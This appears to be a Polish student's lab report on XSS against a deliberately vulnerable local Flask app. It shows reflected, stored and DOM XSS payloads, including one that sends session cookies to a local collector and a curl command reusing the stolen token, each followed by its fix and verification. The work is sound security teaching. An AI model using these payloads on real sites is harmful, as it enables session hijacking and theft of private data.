# Dowody - Laboratorium 6 (XSS)

Środowisko lokalne: aplikacja `http://127.0.0.1:8080`, zbieracz `http://localhost:8081`.
Ładunki nieszkodliwe: zmieniają wygląd/tytuł strony lub wysyłają dane wyłącznie do lokalnego zbieracza.
Wszystkie ataki wykonane na dostarczonej, celowo podatnej aplikacji w izolowanym kontenerze.

---

## Zadanie 1 - XSS odbity

**Miejsce błędu:** `aplikacja/app.py` - trasa `/szukaj`. Parametr `q` (zmienna `fraza`)
trafiał do HTML bez kodowania. Przed poprawką:

```python
html += "<h1>Wyniki wyszukiwania dla: " + fraza + "</h1><ul>"
```

**Adres z ładunkiem** (zmienia tło na czerwone i tytuł karty na `XSS-odbity`):

```
http://127.0.0.1:8080/szukaj?q=%3Cscript%3Edocument.body.style.background='red';document.title='XSS-odbity'%3C/script%3E
```

Ładunek (przed zakodowaniem URL):

```html
<script>document.body.style.background='red';document.title='XSS-odbity'</script>
```

**Fragment odpowiedzi PRZED poprawką** (skrypt interpretowany jako kod):

```html
<h1>Wyniki wyszukiwania dla: <script>document.body.style.background='red';document.title='XSS-odbity'</script></h1>
```

**Fragment odpowiedzi PO poprawce** (wartość jako zwykły tekst):

```html
<h1>Wyniki wyszukiwania dla: &lt;script&gt;document.body.style.background=&#x27;red&#x27;;document.title=&#x27;XSS-odbity&#x27;&lt;/script&gt;</h1>
```

**Poprawka** (`app.py`, wiersz 48; `escape` z modułu `html`):

```python
html += "<h1>Wyniki wyszukiwania dla: " + escape(fraza) + "</h1><ul>"
```

Po poprawce `/szukaj?q=konsultacje` nadal znajduje ogłoszenie z frazą "Konsultacje w piątek".

---

## Zadanie 2 - XSS zapisany i przejęcie sesji

**Ładunek** dodany jako treść ogłoszenia (konto `student`) - wysyła `document.cookie`
do zbieracza przez adres obrazka:

```html
<img src=x onerror="new Image().src='http://localhost:8081/?c='+encodeURIComponent(document.cookie)">
```

**Wpis zbieracza PRZED zmianą** (HttpOnly=False; ciasteczko czytelne dla skryptu,
wartość skrócona):

```
ZEBRANO: /?c=session=eyJ1enl0a...RkZ5o
```

**Krok 3 - użycie skradzionego tokenu bez hasła:**

```
curl.exe -i -b "session=eyJ1enl0a...RkZ5o" http://127.0.0.1:8080/notatka
```

Wynik: zwrócono prywatną notatkę **Anny** ("kod do szafki w pracowni 4721") -
sesja przejęta samym tokenem okaziciela.

**Wpis zbieracza PO zmianie** (HttpOnly=True; `document.cookie` dla sesji jest puste):

```
ZEBRANO: /?c=
```

**Nagłówki `Set-Cookie` z odpowiedzi na `/logowanie`** (wartość tokenu skrócona):

- PRZED: `Set-Cookie: session=eyJ1enl0a...RkZ5o; Path=/`
- PO:    `Set-Cookie: session=eyJ1enl0a...Nf2q1; HttpOnly; Path=/`

**Poprawka** (`app.py`, wiersz 11):

```python
app.config["SESSION_COOKIE_HTTPONLY"] = True
```

---

## Zadanie 3 - Naprawa i Content Security Policy

**a) Wyłączone kodowanie w szablonie** - `templates/tablica.html`:

```jinja
PRZED:  <li><b>{{ autor }}</b>: {{ tresc|safe }}</li>
PO:     <li><b>{{ autor }}</b>: {{ tresc }}</li>
```

Filtr `|safe` wyłączał automatyczne kodowanie Jinja2 - to on umożliwiał XSS zapisany
z zadania 2. Po usunięciu treść ogłoszeń jest kodowana jako tekst.

**b) DOM XSS w `/podglad`** - ładunek w atrybucie zdarzenia `onerror`
(zmienia tytuł karty na `XSS-DOM`):

```
http://127.0.0.1:8080/podglad#%3Cimg%20src=x%20onerror=document.title='XSS-DOM'%3E
```

Fragment po `#` (przed zakodowaniem URL):

```html
<img src=x onerror=document.title='XSS-DOM'>
```

Działało, bo skrypt strony robił `element.innerHTML = decodeURIComponent(location.hash...)`.
`<script>` wstawiony przez innerHTML się nie wykonuje, ale atrybut `onerror` - tak.

**Poprawka:** skrypt przeniesiony do `static/podglad.js`, użyto `textContent`:

```js
document.getElementById("podglad").textContent =
  decodeURIComponent(location.hash.slice(1));
```

`textContent` wstawia dane dosłownie (nie jako HTML), więc znaczniki się nie interpretują.

**c) Nagłówek CSP** - dekorator `@app.after_request` w `app.py`:

```python
@app.after_request
def dodaj_csp(odpowiedz):
    odpowiedz.headers["Content-Security-Policy"] = (
        "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'"
    )
    return odpowiedz
```

Nagłówek z odpowiedzi:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
```

**d) Test tekstu dosłownego** - ogłoszenie:

```
Zażółć gęślą jaźń: <b>pogrubienie</b> & "cudzysłów" 'apostrof'
```

Wyświetla się dosłownie (znaczniki `<b>` jako tekst, `&` i cudzysłowy bez zmian),
bo Jinja2 koduje je do `&lt;b&gt;`, `&amp;`, `&#34;`, `&#39;`. Podgląd pokazuje
zwykły tekst.

### Tabela trzech ładunków

| Ładunek | PRZED naprawą | PO naprawie |
|---|---|---|
| odbity (`/szukaj?q=<script>...`) | skrypt wykonany, tło czerwone, tytuł `XSS-odbity` | wyświetlony jako tekst |
| zapisany (`<img onerror=...cookie>`) | skrypt wykonany, ciasteczko u zbieracza | wyświetlony jako tekst; CSP blokuje inline i wysyłkę cross-origin |
| DOM (`/podglad#<img onerror=...>`) | `onerror` wykonany, tytuł `XSS-DOM` | wstawiony przez `textContent` jako tekst |

## Weryfikacja (test_client, bez przeglądarki)

```
Zadanie 1: surowy <script> w odpowiedzi: False; &lt;script&gt; obecny: True; szukanie 'konsultacje': znajduje
Zadanie 2: SESSION_COOKIE_HTTPONLY = True; Set-Cookie zawiera HttpOnly: True
Zadanie 3: wpis w tablicy zakodowany (&lt;img): True; CSP: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
           podglad.html bez innerHTML: True; podglad.js uzywa textContent: True
```
